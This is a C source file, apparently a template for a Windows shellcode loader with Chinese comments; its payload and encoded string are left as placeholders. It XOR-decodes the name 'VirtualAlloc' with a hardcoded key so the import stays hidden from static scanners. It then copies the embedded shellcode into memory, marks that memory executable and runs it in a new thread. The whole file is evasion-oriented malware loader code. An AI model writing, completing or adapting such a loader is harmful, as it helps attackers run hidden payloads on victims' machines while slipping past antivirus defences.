#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = {Shellcode};  //嵌入Shellcode
unsigned int shellcode_len = sizeof(shellcode);
unsigned char cVirtualAlloc[] = {XOR};  //嵌入XOR加密后的字符串
unsigned int cVirtualAllocLen = sizeof(cVirtualAlloc);
char secret[] = "12345abcde67890";  //秘钥

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

void XOR(char *data, size_t data_len, char *key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(void) {
    void *shellcode_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    XOR((char *)cVirtualAlloc, cVirtualAllocLen, secret, sizeof(secret));
    LPCSTR funcName = (LPCSTR)cVirtualAlloc;
    pVirtualAlloc = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandleA("kernel32.dll"), funcName);

    shellcode_mem = pVirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(shellcode_mem, shellcode, shellcode_len);

    rv = VirtualProtect(shellcode_mem, shellcode_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)shellcode_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
